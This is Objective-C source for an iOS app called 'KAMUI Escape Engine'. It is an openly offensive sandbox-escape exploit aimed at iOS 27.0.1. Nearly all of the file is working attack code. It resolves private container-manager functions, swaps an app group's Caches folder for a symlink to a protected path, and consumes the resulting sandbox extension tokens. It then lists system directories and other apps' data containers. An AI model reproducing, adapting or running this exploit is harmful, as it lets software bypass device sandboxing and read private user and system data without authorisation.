#import <UIKit/UIKit.h>
#import <xpc/xpc.h>
#import <dlfcn.h>
#import <sys/stat.h>

// KAMUI Escape Engine - Multi-strategy sandbox escape
// Target: iOS 27.0.1 (iPad15,8)

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void *g_container_mgr = NULL;
static container_query_create_fn query_create = NULL;
static container_query_set_class_fn query_set_class = NULL;
static container_query_set_identifiers_fn query_set_group_identifiers = NULL;
static container_query_set_identifiers_fn query_set_app_identifiers = NULL;
static container_query_set_flags_fn query_set_flags = NULL;
static container_query_set_part_fn query_set_part = NULL;
static container_query_get_single_result_fn query_get_single_result = NULL;
static container_query_free_fn query_free = NULL;
static container_copy_sandbox_token_fn copy_sandbox_token = NULL;
static sandbox_extension_consume_fn consume_extension = NULL;
static sandbox_extension_release_fn release_extension = NULL;

static BOOL init_container_manager(void) {
    if (g_container_mgr) return YES;
    
    g_container_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g_container_mgr) return NO;
    
    query_create = (container_query_create_fn)dlsym(g_container_mgr, "container_query_create");
    query_set_class = (container_query_set_class_fn)dlsym(g_container_mgr, "container_query_set_class");
    query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(g_container_mgr, "container_query_set_group_identifiers");
    query_set_app_identifiers = (container_query_set_identifiers_fn)dlsym(g_container_mgr, "container_query_set_app_identifiers");
    query_set_flags = (container_query_set_flags_fn)dlsym(g_container_mgr, "container_query_operation_set_flags");
    query_set_part = (container_query_set_part_fn)dlsym(g_container_mgr, "container_query_operation_set_part");
    query_get_single_result = (container_query_get_single_result_fn)dlsym(g_container_mgr, "container_query_get_single_result");
    query_free = (container_query_free_fn)dlsym(g_container_mgr, "container_query_free");
    copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(g_container_mgr, "container_copy_sandbox_token");
    consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    
    return (query_create && query_set_class && query_set_group_identifiers && 
            query_set_flags && query_set_part && query_get_single_result && 
            query_free && copy_sandbox_token && consume_extension);
}

// Strategy 1: Class 13 + partDomain traversal (old bad_query) - works on 27.0.x
static int64_t kamui_escape_class13(NSString *target, NSString *identifier) {
    if (!init_container_manager()) return -1;
    
    void *query = query_create();
    if (!query) return -2;
    
    query_set_class(query, 13);  // App Group
    xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
    query_set_group_identifiers(query, id_obj);
    query_set_part(query, 3);  // partDomain
    
    // Create symlink
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
    if (!groupRoot) {
        query_free(query);
        return -3;
    }
    
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        query_free(query);
        return -4;
    }
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -5;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    [fm removeItemAtPath:caches error:nil];
    
    return handle;
}

// Strategy 2: Class 7 part-directory symlink - works on 26.x / 27.2
static int64_t kamui_escape_class7(NSString *target, NSString *identifier) {
    if (!init_container_manager()) return -1;
    
    void *query = query_create();
    if (!query) return -2;
    
    query_set_class(query, 7);  // System Group
    xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
    query_set_group_identifiers(query, id_obj);
    query_set_part(query, 3);
    query_set_flags(query, 0x0000008000000000ULL);
    
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
    if (!groupRoot) {
        query_free(query);
        return -3;
    }
    
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        query_free(query);
        return -4;
    }
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -5;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    [fm removeItemAtPath:caches error:nil];
    
    return handle;
}

// Strategy 3: Class 13 direct MobileGestalt query
static int64_t kamui_escape_mg_direct(NSString *identifier) {
    if (!init_container_manager()) return -1;
    
    void *query = query_create();
    if (!query) return -2;
    
    query_set_class(query, 13);
    xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
    query_set_group_identifiers(query, id_obj);
    query_set_part(query, 3);
    query_set_flags(query, 0x0000000800000000ULL);  // alt flags
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        return -3;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        return -4;
    }
    
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    
    return handle;
}

// Strategy 4: Class 12 geod + traversal (older builds)
static int64_t kamui_escape_geod(NSString *target) {
    if (!init_container_manager()) return -1;
    
    void *query = query_create();
    if (!query) return -2;
    
    query_set_class(query, 12);  // PluginKit
    xpc_object_t id_obj = xpc_string_create("com.apple.geod");
    query_set_app_identifiers(query, id_obj);
    query_set_part(query, 3);
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        return -3;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        return -4;
    }
    
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    
    return handle;
}

static void kamui_release(int64_t handle) {
    if (handle >= 0 && release_extension) {
        release_extension(handle);
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.text = @"KAMUI Escape Engine\nTarget: iOS 27.0.1\n\n";
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self escape];
    });
    
    return YES;
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:[msg stringByAppendingString:@"\n"]];
    });
}

- (void)testEscape:(NSString *)name handle:(int64_t)handle path:(NSString *)path {
    if (handle >= 0) {
        NSString *msg = [NSString stringWithFormat:@"\n*** %@ SUCCESS (handle: %lld) ***", name, handle];
        [self log:msg];
        
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *contents = [fm contentsOfDirectoryAtPath:path error:nil];
        if (contents) {
            [self log:[NSString stringWithFormat:@"  Contents of %@:", path]];
            for (NSString *item in [contents subarrayWithRange:NSMakeRange(0, MIN(10, contents.count))]) {
                [self log:[NSString stringWithFormat:@"    %@", item]];
            }
            if (contents.count > 10) {
                [self log:[NSString stringWithFormat:@"    ... and %lu more", (unsigned long)(contents.count - 10)]];
            }
        }
        
        kamui_release(handle);
    } else {
        [self log:[NSString stringWithFormat:@"[-] %@ failed: %lld", name, handle]];
    }
}

- (void)escape {
    [self log:@"[1] Initializing KAMUI escape engine...\n"];
    
    if (!init_container_manager()) {
        [self log:@"[-] Failed to load container manager"];
        return;
    }
    
    [self log:@"[+] Container manager loaded\n"];
    
    NSString *appGroup = @"group.com.jasonquiles.F1OOB";
    
    // Test Strategy 1: Class 13 traversal (best for 27.0.1)
    [self log:@"[2] Trying Strategy 1: Class 13 partDomain traversal..."];
    int64_t h1 = kamui_escape_class13(@"/var/containers/Data/System", appGroup);
    [self testEscape:@"Strategy 1 (Class 13)" handle:h1 path:@"/var/containers/Data/System"];
    
    usleep(100000);
    
    // Test Strategy 2: Class 7 symlink
    [self log:@"\n[3] Trying Strategy 2: Class 7 part-directory symlink..."];
    int64_t h2 = kamui_escape_class7(@"/var/mobile/Containers/Data/InternalDaemon", appGroup);
    [self testEscape:@"Strategy 2 (Class 7)" handle:h2 path:@"/var/mobile/Containers/Data/InternalDaemon"];
    
    usleep(100000);
    
    // Test Strategy 3: Direct MobileGestalt
    [self log:@"\n[4] Trying Strategy 3: Class 13 direct MG query..."];
    int64_t h3 = kamui_escape_mg_direct(appGroup);
    [self testEscape:@"Strategy 3 (MG Direct)" handle:h3 path:@"/var/mobile/Library/MobileGestalt"];
    
    usleep(100000);
    
    // Test Strategy 4: geod traversal
    [self log:@"\n[5] Trying Strategy 4: Class 12 geod traversal..."];
    int64_t h4 = kamui_escape_geod(@"/var/mobile/Containers/Data/Application");
    [self testEscape:@"Strategy 4 (geod)" handle:h4 path:@"/var/mobile/Containers/Data/Application"];
    
    [self log:@"\n[6] All strategies complete"];
    [self log:@"If any succeeded, we have sandbox escape"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
